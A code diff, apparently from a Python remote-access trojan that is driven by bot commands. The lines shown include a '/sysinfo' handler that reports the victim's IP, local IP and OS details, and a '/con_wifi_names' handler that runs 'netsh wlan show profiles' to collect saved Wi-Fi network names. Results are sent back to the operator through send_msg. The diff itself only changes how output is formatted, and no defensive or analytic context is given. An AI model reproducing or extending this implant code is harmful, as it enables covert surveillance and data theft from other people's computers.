@@ -93,7 +93,7 @@ if check_internret():
                     if command == "/sysinfo":
                         try:
                             u = uname()
-                            info = f"""IP: {ip}
+                            info = f"""    IP: {ip}
     Local IP: {local_ip}
     System: {u[0]}
     System Version: {u[2]}
@@ -202,7 +202,11 @@ if check_internret():
                             else: os.Check_exist(File_name=file)
                             send_msg(f"This is the response:\n{state}")
                         except: send_msg("Error;")
-                    if command == "/commands": send_msg(f"{commands}")
+                    if command == "/commands": 
+                        commands_txt = """"""
+                        for i in range(len(commands)):
+                            commands_txt += f"{i+1}. {commands[i]}"
+                        send_msg(commands_txt)
                     if command == "/con_wifi_names":
                         try:
                             names = getoutput("netsh wlan show profiles").replace("Profiles on interface Wi-Fi:", "").replace("Group policy profiles (read only)", "").replace("---------------------------------", "").replace("    <None>", "").replace("\n\n\n\n\n\n\n", "").replace("User profiles", "").replace("-------------", "").replace("    ", "").replace("\n\n", "").replace("All User Profile : ", "").split("\n")
